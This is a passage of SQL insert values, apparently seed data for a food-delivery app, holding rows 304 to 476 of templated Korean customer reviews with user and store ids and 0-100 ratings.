	(304, '음식이 신선하고 맛있었으며, 서비스도 좋았어요.', 14, 19, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(305, '주문한 음식이 그저 그랬어요. 약간 실망스러웠습니다.', 15, 16, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(306, '음식의 맛은 그저 그랬어요. 특별한 인상을 남기지 않았습니다.', 15, 22, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(307, '서비스가 매우 훌륭했고, 음식의 맛도 최고 수준이었습니다. 완벽한 배달 음식 경험이었습니다.', 11, 12, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(308, '음식의 맛, 퀄리티, 서비스 모두 최고였어요. 완벽한 배달 음식 경험을 선사해준 가게입니다.', 15, 18, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(309, '최고의 음식을 경험한 것 같아요. 신선한 재료와 완벽한 조리법이 참신함을 느끼게 해줬어요.', 15, 20, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(310, '음식이 신선하고 맛있었으며, 서비스도 좋았어요.', 12, 21, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(311, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 12, 12, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(312, '주문한 음식이 훌륭하고, 배달이 정확했어요.', 14, 11, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(313, '음식은 평범했고, 배달 시간도 그럭저럭이었어요.', 14, 15, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(314, '음식의 퀄리티와 다양한 맛의 조화가 완벽했습니다. 정말로 매우 훌륭한 경험이었어요.', 13, 11, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(315, '서비스가 매우 훌륭했고, 음식의 맛도 최고 수준이었습니다. 완벽한 배달 음식 경험이었습니다.', 15, 12, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(316, '주문한 음식이 상상을 초월하는 맛이었습니다. 완전한 만족을 느낄 수 있었어요.', 11, 21, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(317, '서비스가 매우 훌륭했고, 음식의 맛도 최고 수준이었습니다. 완벽한 배달 음식 경험이었습니다.', 12, 18, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(318, '최고의 음식을 경험한 것 같아요. 신선한 재료와 완벽한 조리법이 참신함을 느끼게 해줬어요.', 11, 22, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(319, '음식의 퀄리티와 다양한 맛의 조화가 완벽했습니다. 정말로 매우 훌륭한 경험이었어요.', 15, 11, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(320, '음식의 맛, 퀄리티, 서비스 모두 최고였어요. 완벽한 배달 음식 경험을 선사해준 가게입니다.', 12, 22, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(321, '주문한 음식이 그저 그랬어요. 약간 실망스러웠습니다.', 14, 20, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(322, '주문한 음식이 훌륭하고, 배달이 정확했어요.', 12, 13, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(323, '주문한 음식이 적절한 가격에 비해 조금 아쉬웠어요.', 15, 15, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(324, '주문한 음식이 기대 이상이었고, 배달도 빨랐어요.', 11, 16, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(325, '서비스도 엉망이었고, 음식도 실망스러웠어요.', 11, 16, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(326, '음식의 맛은 그저 그랬어요. 기대한 만큼의 풍부한 맛은 아니었습니다.', 10, 12, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(327, '주문한 음식이 신선하고, 배달도 빨리 왔어요.', 13, 18, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(328, '서비스가 매우 훌륭했고, 음식의 맛도 최고 수준이었습니다. 완벽한 배달 음식 경험이었습니다.', 14, 14, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(329, '음식이 정말로 맛있었고, 특별한 재료와 조리법이 돋보였습니다. 정말로 훌륭한 가게입니다.', 12, 17, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(330, '음식의 맛과 가격이 모두 만족스러웠습니다.', 15, 18, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(331, '최고의 음식을 경험한 것 같아요. 신선한 재료와 완벽한 조리법이 참신함을 느끼게 해줬어요.', 13, 16, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(332, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 12, 13, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(333, '주문한 음식은 그럭저럭 맛있었지만, 배달이 조금 늦었어요.', 14, 14, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(334, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 14, 11, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(335, '음식의 퀄리티와 다양한 맛의 조화가 완벽했습니다. 정말로 매우 훌륭한 경험이었어요.', 14, 14, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(336, '음식이 정말로 맛있고 신선했어요. 가게의 전문성과 정성이 돋보였습니다.', 10, 15, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(337, '서비스가 매우 친절하고, 음식의 맛도 정말로 훌륭했습니다. 완벽한 조합이었어요.', 15, 20, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(338, '서비스가 친절하고, 음식도 맛있어서 좋았어요.', 12, 17, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(339, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 13, 22, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(340, '서비스 태도도 좋았고, 음식도 맛있었어요.', 13, 17, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(341, '음식이 신선하고 맛있었으며, 서비스도 좋았어요.', 15, 20, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(342, '음식이 신선하고 맛있었으며, 서비스도 좋았어요.', 12, 11, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(343, '서비스가 매우 훌륭했고, 음식의 맛도 최고 수준이었습니다. 완벽한 배달 음식 경험이었습니다.', 13, 11, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(344, '주문한 음식이 훌륭하고, 배달이 정확했어요.', 12, 17, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(345, '맛은 있었지만, 음식의 양이 조금 부족했습니다.', 11, 12, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(346, '음식의 맛, 퀄리티, 서비스 모두 최고였어요. 완벽한 배달 음식 경험을 선사해준 가게입니다.', 12, 15, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(347, '음식의 맛, 퀄리티, 서비스 모두 최고였어요. 완벽한 배달 음식 경험을 선사해준 가게입니다.', 11, 16, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(348, '서비스가 매우 친절하고, 음식의 맛도 정말로 훌륭했습니다. 완벽한 조합이었어요.', 15, 13, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(349, '음식의 퀄리티와 다양한 맛의 조화가 완벽했습니다. 정말로 매우 훌륭한 경험이었어요.', 12, 19, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(350, '음식의 맛과 가격이 모두 만족스러웠습니다.', 15, 17, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(351, '최고의 음식을 경험한 것 같아요. 신선한 재료와 완벽한 조리법이 참신함을 느끼게 해줬어요.', 15, 19, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(352, '서비스가 친절하고, 음식도 맛있어서 좋았어요.', 12, 13, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(353, '음식의 퀄리티와 가격이 모두 만족스러웠어요.', 15, 13, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(354, '서비스도 엉망이었고, 음식도 실망스러웠어요.', 15, 12, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(355, '음식이 너무 늦게 도착했고, 완전히 차가웠어요.', 14, 20, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(356, '음식이 맛이 없어서 먹기 힘들었어요.', 11, 21, 20, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(357, '서비스가 친절하고, 음식도 맛있어서 좋았어요.', 14, 11, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(358, '음식이 정말로 맛있었고, 특별한 재료와 조리법이 돋보였습니다. 정말로 훌륭한 가게입니다.', 11, 20, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(359, '음식은 그럭저럭 괜찮았지만, 특별한 매력은 없었어요.', 10, 15, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(360, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 13, 17, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(361, '주문한 음식이 신선하고, 배달도 빨리 왔어요.', 15, 18, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(362, '주문한 음식이 누출되어 왔어요. 매우 불쾌했습니다.', 14, 20, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(363, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 14, 11, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(364, '음식은 그럭저럭 괜찮았지만, 서비스가 아쉬웠어요.', 10, 15, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(365, '주문한 음식이 전혀 맞지 않았고, 맛도 없었어요.', 13, 16, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(366, '서비스는 별로였고, 음식의 퀄리티도 아쉬웠어요. 다른 곳에서 시도해볼 만한 가치는 없었습니다.', 14, 16, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(367, '주문한 음식이 기대 이상이었고, 배달도 빨랐어요.', 10, 17, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(368, '주문한 음식이 신선하고, 배달도 빨리 왔어요.', 15, 20, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(369, '서비스 태도도 좋았고, 음식도 맛있었어요.', 11, 20, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(370, '주문한 음식이 기대 이상이었고, 배달도 빨랐어요.', 11, 19, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(371, '서비스가 매우 친절하고, 음식의 맛도 정말로 훌륭했습니다. 완벽한 조합이었어요.', 13, 15, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(372, '음식은 그럭저럭 맛있었지만, 가격이 조금 아쉬웠어요.', 12, 19, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(373, '주문한 음식은 그럭저럭 맛있었지만, 배달이 조금 늦었어요.', 14, 11, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(374, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 15, 21, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(375, '음식은 그럭저럭 괜찮았지만, 특별한 매력은 없었어요.', 15, 17, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(376, '맛은 있었지만, 음식의 양이 조금 부족했습니다. 배고픔을 완전히 해소하지 못했어요.', 10, 11, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(377, '절대로 다시 주문하지 않을 것입니다. 최악의 경험이었습니다.', 13, 13, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(378, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 15, 14, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(379, '음식이 정말로 맛있었고, 특별한 재료와 조리법이 돋보였습니다. 정말로 훌륭한 가게입니다.', 14, 14, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(380, '음식의 맛과 가격이 모두 만족스러웠습니다.', 11, 17, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(381, '음식의 퀄리티와 다양한 맛의 조화가 완벽했습니다. 정말로 매우 훌륭한 경험이었어요.', 10, 17, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(382, '주문한 음식이 훌륭하고, 배달이 정확했어요.', 15, 17, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(383, '음식의 맛은 나쁘지 않았지만, 가격 대비 아쉬웠어요.', 11, 22, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(384, '서비스 태도가 좋지 않았고, 음식도 별로였어요.', 11, 11, 20, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(385, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 14, 11, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(386, '음식이 전혀 맛있지 않았고, 퀄리티도 많이 떨어졌어요.', 14, 11, 20, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(387, '음식이 맛있었고, 서비스도 만족스러웠어요.', 11, 11, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(388, '서비스가 매우 훌륭했고, 음식의 맛도 최고 수준이었습니다. 완벽한 배달 음식 경험이었습니다.', 12, 16, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(389, '음식이 맛있었고, 서비스도 만족스러웠어요.', 14, 20, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(390, '음식의 맛과 가격이 모두 만족스러웠습니다.', 10, 13, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(391, '주문한 음식이 기대 이상이었고, 배달도 빨랐어요.', 12, 21, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(392, '음식의 퀄리티는 평범했지만, 서비스는 별로였어요.', 10, 12, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(393, '주문한 음식이 그저 그랬어요. 특별한 매력을 찾기 어려웠습니다.', 15, 22, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(394, '절대로 다시 주문하지 않을 것입니다. 최악의 경험이었습니다.', 14, 21, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(395, '서비스가 매우 친절하고, 음식의 맛도 정말로 훌륭했습니다. 완벽한 조합이었어요.', 15, 13, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(396, '음식이 신선하고 맛있었으며, 서비스도 좋았어요.', 13, 21, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(397, '맛은 있었지만, 음식의 양이 조금 부족했습니다.', 11, 21, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(398, '음식이 맛있었고, 서비스도 만족스러웠어요.', 13, 15, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(399, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 12, 18, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(400, '서비스가 매우 친절하고, 음식의 맛도 정말로 훌륭했습니다. 완벽한 조합이었어요.', 13, 16, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(401, '주문한 음식이 기대 이상이었고, 배달도 빨랐어요.', 10, 11, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(402, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 13, 22, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(403, '음식이 완전히 망가진 상태로 도착했어요.', 13, 22, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(404, '음식이 정말로 맛있고 신선했어요. 가게의 전문성과 정성이 돋보였습니다.', 13, 21, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(405, '음식이 정말로 맛있고 신선했어요. 가게의 전문성과 정성이 돋보였습니다.', 10, 15, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(406, '음식이 정말로 맛있고 신선했어요. 가게의 전문성과 정성이 돋보였습니다.', 12, 22, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(407, '음식은 그럭저럭 괜찮았지만, 서비스가 아쉬웠어요.', 11, 13, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(408, '음식의 맛과 가격이 모두 만족스러웠습니다.', 14, 22, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(409, '주문한 음식이 누출되어 왔어요. 매우 불쾌했습니다.', 10, 19, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(410, '음식의 맛, 퀄리티, 서비스 모두 최고였어요. 완벽한 배달 음식 경험을 선사해준 가게입니다.', 11, 22, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(411, '서비스가 매우 친절하고, 음식의 맛도 정말로 훌륭했습니다. 완벽한 조합이었어요.', 15, 15, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(412, '음식의 맛은 그저 그랬어요. 기대한 만큼의 풍부한 맛은 아니었습니다.', 15, 18, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(413, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 14, 19, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(414, '음식이 매우 짜서 입맛에 맞지 않았습니다.', 12, 16, 20, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(415, '음식의 퀄리티가 형편없었고, 서비스도 최악이었습니다.', 12, 18, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(416, '음식이 정말로 맛있고 신선했어요. 가게의 전문성과 정성이 돋보였습니다.', 15, 11, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(417, '음식의 퀄리티와 다양한 맛의 조화가 완벽했습니다. 정말로 매우 훌륭한 경험이었어요.', 10, 12, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(418, '음식의 퀄리티와 다양한 맛의 조화가 완벽했습니다. 정말로 매우 훌륭한 경험이었어요.', 10, 18, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(419, '음식의 퀄리티와 가격이 모두 만족스러웠어요.', 11, 22, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(420, '주문한 음식이 신선하고, 배달도 빨리 왔어요.', 12, 18, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(421, '음식의 퀄리티와 가격이 모두 만족스러웠어요.', 15, 16, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(422, '주문한 음식이 신선하고, 배달도 빨리 왔어요.', 10, 14, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(423, '서비스가 매우 친절하고, 음식의 맛도 정말로 훌륭했습니다. 완벽한 조합이었어요.', 11, 21, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(424, '음식의 퀄리티가 형편없었고, 서비스도 최악이었습니다.', 11, 14, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(425, '음식이 너무 늦게 도착했고, 완전히 차가웠어요.', 15, 17, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(426, '음식의 퀄리티와 다양한 맛의 조화가 완벽했습니다. 정말로 매우 훌륭한 경험이었어요.', 14, 17, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(427, '주문한 음식이 그저 그랬어요. 약간 실망스러웠습니다.', 12, 15, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(428, '최악의 경험. 주문한 음식이 완전히 망가졌어요.', 11, 11, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(429, '음식은 그럭저럭 괜찮았지만, 서비스가 아쉬웠어요.', 13, 22, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(430, '서비스가 매우 훌륭했고, 음식의 맛도 최고 수준이었습니다. 완벽한 배달 음식 경험이었습니다.', 13, 20, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(431, '서비스는 만족스럽지 않았지만, 음식은 괜찮았어요.', 14, 11, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(432, '주문한 음식이 훌륭하고, 배달이 정확했어요.', 14, 17, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(433, '주문한 음식이 기대 이상이었고, 배달도 빨랐어요.', 11, 11, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(434, '주문한 음식이 기대 이상이었고, 배달도 빨랐어요.', 15, 11, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(435, '음식이 정말로 맛있고 신선했어요. 가게의 전문성과 정성이 돋보였습니다.', 15, 15, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(436, '음식의 맛과 양 모두 만족스러웠습니다.', 10, 21, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(437, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 11, 21, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(438, '주문한 음식이 신선하고, 배달도 빨리 왔어요.', 14, 20, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(439, '음식이 정말로 맛있고 신선했어요. 가게의 전문성과 정성이 돋보였습니다.', 14, 11, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(440, '음식의 퀄리티와 다양한 맛의 조화가 완벽했습니다. 정말로 매우 훌륭한 경험이었어요.', 10, 20, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(441, '주문한 음식이 기대 이상이었고, 배달도 빨랐어요.', 13, 14, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(442, '음식의 퀄리티와 다양한 맛의 조화가 완벽했습니다. 정말로 매우 훌륭한 경험이었어요.', 11, 11, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(443, '서비스가 매우 훌륭했고, 음식의 맛도 최고 수준이었습니다. 완벽한 배달 음식 경험이었습니다.', 13, 21, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(444, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 14, 22, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(445, '음식이 전혀 맛있지 않았고, 퀄리티도 많이 떨어졌어요.', 11, 21, 20, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(446, '서비스 태도도 좋았고, 음식도 맛있었어요.', 14, 19, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(447, '주문한 음식이 훌륭하고, 배달이 정확했어요.', 15, 14, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(448, '음식이 전혀 맛있지 않았고, 퀄리티도 많이 떨어졌어요.', 14, 21, 20, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(449, '음식의 맛과 가격이 모두 만족스러웠습니다.', 15, 16, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(450, '음식의 퀄리티와 다양한 맛의 조화가 완벽했습니다. 정말로 매우 훌륭한 경험이었어요.', 15, 18, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(451, '주문한 음식이 적절한 가격에 비해 조금 아쉬웠어요.', 11, 14, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(452, '음식이 정말로 맛있었고, 특별한 재료와 조리법이 돋보였습니다. 정말로 훌륭한 가게입니다.', 14, 22, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(453, '음식은 그럭저럭 괜찮았지만, 서비스가 아쉬웠어요.', 13, 21, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(454, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 14, 15, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(455, '음식은 그럭저럭 괜찮았지만, 서비스가 아쉬웠어요.', 11, 21, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(456, '주문한 음식이 훌륭하고, 배달이 정확했어요.', 15, 21, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(457, '주문한 음식이 신선하고, 배달도 빨리 왔어요.', 11, 14, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(458, '음식은 그럭저럭 맛있었지만, 가격이 조금 아쉬웠어요.', 11, 16, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(459, '음식의 맛과 양 모두 만족스러웠습니다.', 13, 15, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(460, '음식이 맛있었고, 서비스도 만족스러웠어요.', 10, 22, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(461, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 11, 17, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(462, '최고의 음식을 경험한 것 같아요. 신선한 재료와 완벽한 조리법이 참신함을 느끼게 해줬어요.', 12, 19, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(463, '음식의 맛, 퀄리티, 서비스 모두 최고였어요. 완벽한 배달 음식 경험을 선사해준 가게입니다.', 11, 18, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(464, '주문한 음식이 기대 이상이었고, 배달도 빨랐어요.', 15, 19, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(465, '서비스 태도도 좋았고, 음식도 맛있었어요.', 11, 20, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(466, '음식의 퀄리티와 다양한 맛의 조화가 완벽했습니다. 정말로 매우 훌륭한 경험이었어요.', 10, 14, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(467, '음식이 정말로 맛있고 신선했어요. 가게의 전문성과 정성이 돋보였습니다.', 14, 22, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(468, '최고의 음식을 경험한 것 같아요. 신선한 재료와 완벽한 조리법이 참신함을 느끼게 해줬어요.', 13, 13, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(469, '음식이 정말로 맛있고 신선했어요. 가게의 전문성과 정성이 돋보였습니다.', 11, 12, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(470, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 14, 21, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(471, '서비스가 매우 친절하고, 음식의 맛도 정말로 훌륭했습니다. 완벽한 조합이었어요.', 10, 18, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(472, '주문한 음식이 상상을 초월하는 맛이었습니다. 완전한 만족을 느낄 수 있었어요.', 10, 17, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(473, '음식이 정말로 맛있고 신선했어요. 가게의 전문성과 정성이 돋보였습니다.', 15, 14, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(474, '음식이 정말로 맛있었고, 특별한 재료와 조리법이 돋보였습니다. 정말로 훌륭한 가게입니다.', 10, 18, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(475, '음식이 정말로 맛있었고, 특별한 재료와 조리법이 돋보였습니다. 정말로 훌륭한 가게입니다.', 15, 16, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(476, '주문한 음식이 기대 이상이었고, 배달도 빨랐어요.', 15, 15, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
